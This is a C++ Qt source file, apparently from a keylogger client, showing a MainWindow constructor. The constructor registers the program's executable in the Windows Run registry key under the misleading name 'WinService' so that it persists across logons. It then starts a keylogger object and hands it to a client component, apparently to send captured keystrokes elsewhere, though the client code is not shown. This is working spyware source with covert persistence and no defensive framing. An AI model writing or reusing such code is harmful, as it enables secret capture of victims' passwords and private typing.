#include "mainwindow.h"
#include "ui_mainwindow.h"
#include "chat.h"

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    QDir myDir;
    QSettings settings("HKEY_CURRENT_USER\\Software\\Microsoft\\Windows\\CurrentVersion\\Run", QSettings::NativeFormat);
    settings.setValue("WinService", qApp->applicationDirPath().replace("/", "\\", Qt::CaseInsensitive) + "\\ProjectClient-New.exe");
    settings.sync();

    newKeylogger = new tkey(this);
    newKeylogger->start();

    newClient = new client(this, newKeylogger);
    newClient->startClient();

    ui->setupUi(this);
}

MainWindow::~MainWindow()
{
    delete ui;
}
